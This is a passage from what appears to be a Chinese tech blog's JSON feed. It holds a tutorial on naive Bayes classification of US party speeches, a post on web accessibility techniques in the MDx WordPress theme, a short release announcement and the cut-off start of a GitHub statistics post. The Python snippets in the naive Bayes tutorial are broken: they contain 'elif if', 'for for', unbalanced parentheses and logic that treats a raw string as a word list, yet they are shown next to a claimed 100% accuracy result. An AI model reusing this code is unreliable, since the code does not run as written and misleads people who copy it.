\\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 